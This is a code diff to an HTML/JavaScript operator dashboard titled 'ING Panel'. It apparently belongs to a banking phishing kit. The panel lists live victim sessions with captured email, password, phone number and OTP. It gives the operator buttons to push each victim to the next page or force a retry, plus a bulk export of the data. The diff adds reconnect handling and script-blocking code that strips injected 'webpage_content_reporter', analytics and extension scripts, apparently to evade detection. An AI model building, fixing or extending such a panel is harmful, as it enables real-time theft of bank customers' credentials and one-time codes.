@@ -4,6 +4,9 @@
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>ING Panel</title>
+  <meta http-equiv="X-Content-Type-Options" content="nosniff">
+  <meta http-equiv="X-Frame-Options" content="DENY">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' https: data: blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval' https:; connect-src 'self' https: wss:; img-src 'self' data: https:; style-src 'self' 'unsafe-inline' https://rsms.me;">
   <link rel="preconnect" href="https://rsms.me">
   <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
   <style>
@@ -85,10 +88,25 @@
     .alert-error{border-left:3px solid var(--red)}.alert-error .alert-icon{background:rgba(251,113,133,.15);color:var(--red)}
     @keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
     @keyframes fadeOut{to{opacity:0;transform:translateX(20px)}}
+    
+    /* Error overlay */
+    #error-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:9999;align-items:center;justify-content:center;flex-direction:column}
+    #error-overlay.active{display:flex}
+    .error-box{background:#111;border:1px solid var(--red);border-radius:12px;padding:32px;max-width:400px;text-align:center}
+    .error-title{color:var(--red);font-size:18px;font-weight:600;margin-bottom:12px}
+    .error-text{color:var(--text-muted);font-size:14px;margin-bottom:20px}
   </style>
 </head>
 <body>
   <div id="alert-container"></div>
+  
+  <div id="error-overlay">
+    <div class="error-box">
+      <div class="error-title">Connection Lost</div>
+      <div class="error-text">Unable to connect to panel. Retrying...</div>
+      <button class="btn" onclick="location.reload()">Reload Now</button>
+    </div>
+  </div>
 
   <div class="greet-bar">
     Hello, <span id="userName">admin</span>! • <span id="clock">--:-- --</span>
@@ -135,7 +153,50 @@
   </div>
 
   <script>
+    // Block extension script injection
+    const observer = new MutationObserver((mutations) => {
+      mutations.forEach((m) => {
+        m.addedNodes.forEach((n) => {
+          if (n.tagName === 'SCRIPT' && n.src && (
+            n.src.includes('webpage_content_reporter') ||
+            n.src.includes('cloudflareinsights') ||
+            n.src.includes('extension')
+          )) {
+            console.log('Blocked injected script:', n.src);
+            n.remove();
+          }
+        });
+      });
+    });
+    observer.observe(document.head, { childList: true, subtree: true });
+    
+    // Suppress extension errors
+    window.onerror = function(msg, url, line, col, error) {
+      if (url && (
+        url.includes('webpage_content_reporter') ||
+        url.includes('extension') ||
+        url.includes('content-script')
+      )) {
+        console.log('Suppressed extension error:', msg);
+        return true;
+      }
+      console.error('Error:', msg, 'at', url, line, col);
+      return false;
+    };
+    
+    // Suppress unhandled rejections from extensions
+    window.addEventListener('unhandledrejection', function(e) {
+      if (e.reason && e.reason.toString && (
+        e.reason.toString().includes('extension') ||
+        e.reason.toString().includes('webpage_content_reporter')
+      )) {
+        e.preventDefault();
+        console.log('Suppressed extension rejection');
+      }
+    });
+
     let currentSid = null, jsonData = {}, lastSessions = new Map();
+    let isConnected = true;
     const qs = s => document.querySelector(s);
     const fmt = t => new Date(t).toLocaleTimeString();
     const fmtDate = t => new Date(t).toLocaleString();
@@ -179,31 +240,31 @@
       let html = '<div style="display:flex;gap:6px">';
       
       // Always show view details
-      html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg"></button>`;
+      html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg" onerror="this.style.display='none';this.parentNode.innerHTML='📄'"></button>`;
 
       // Show redo/continue based on page AND data entered - FIXED CONDITIONS
       if (s.page === 'index.html') {
         // On login page: show buttons if credentials entered (check both entered flag and email/password values)
         if (s.entered === true || (s.email && s.password)) {
-          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
-          html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
+          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg" onerror="this.style.display='none';this.parentNode.innerHTML='▶'"></button>`;
+          html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg" onerror="this.style.display='none';this.parentNode.innerHTML='✕'"></button>`;
         }
       } else if (s.page === 'verify.html') {
         // On verify page: show buttons if phone entered
         if (s.phone && s.phone.length > 0) {
-          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
-          html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
+          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg" onerror="this.style.display='none';this.parentNode.innerHTML='▶'"></button>`;
+          html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg" onerror="this.style.display='none';this.parentNode.innerHTML='✕'"></button>`;
         }
       } else if (s.page === 'unregister.html') {
         // On unregister page: show continue if clicked, no redo
         if (s.unregisterClicked === true) {
-          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg" onerror="this.style.display='none';this.parentNode.innerHTML='▶'"></button>`;
         }
       } else if (s.page === 'otp.html') {
         // On OTP page: show buttons if OTP entered
         if (s.otp && s.otp.length > 0) {
-          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
-          html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
+          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg" onerror="this.style.display='none';this.parentNode.innerHTML='▶'"></button>`;
+          html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg" onerror="this.style.display='none';this.parentNode.innerHTML='✕'"></button>`;
         }
       }
       // Note: success page has no buttons (already approved)
@@ -373,26 +434,55 @@
 
     /* ----------  CONTROL  ---------- */
     async function act(action,sid){
-      await fetch('/api/panel',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action,sid})});
-      load();
+      try {
+        await fetch('/api/panel',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action,sid})});
+        load();
+      } catch (e) {
+        console.error('Action failed:', e);
+        showAlert('error', 'Action Failed', 'Could not perform action. Check connection.', 0);
+      }
     }
 
     /* ----------  LOGOUT + EXPORT (bottom-right)  ---------- */
     qs('#logoutBtn').onclick = async () => {
-      await fetch('/panel/logout',{method:'POST'});
-      location.replace('/panel');
+      try {
+        await fetch('/panel/logout',{method:'POST'});
+        location.replace('/panel');
+      } catch (e) {
+        location.replace('/panel');
+      }
     };
     qs('#exportBtn').onclick = () => location.href = '/api/export';
 
-    /* ----------  LONG-POLL  ---------- */
+    /* ----------  LONG-POLL WITH ERROR HANDLING  ---------- */
     async function load(){
-      const d = await fetch('/api/panel').then(r=>r.json());
-      if(d.error)return location.replace('/panel');
-      jsonData = d;
-      checkChanges(d.sessions);
-      render(d);
-      setTimeout(load,300);
+      try {
+        const r = await fetch('/api/panel');
+        if (!r.ok) {
+          if (r.status === 401) return location.replace('/panel');
+          throw new Error(`HTTP ${r.status}`);
+        }
+        const d = await r.json();
+        if(d.error) return location.replace('/panel');
+        
+        // Connection restored
+        if (!isConnected) {
+          isConnected = true;
+          qs('#error-overlay').classList.remove('active');
+        }
+        
+        jsonData = d;
+        checkChanges(d.sessions);
+        render(d);
+      } catch (e) {
+        console.error('Poll error:', e);
+        isConnected = false;
+        qs('#error-overlay').classList.add('active');
+      }
+      setTimeout(load, 300);
     }
+    
+    // Start polling
     load();
   </script>
 </body>
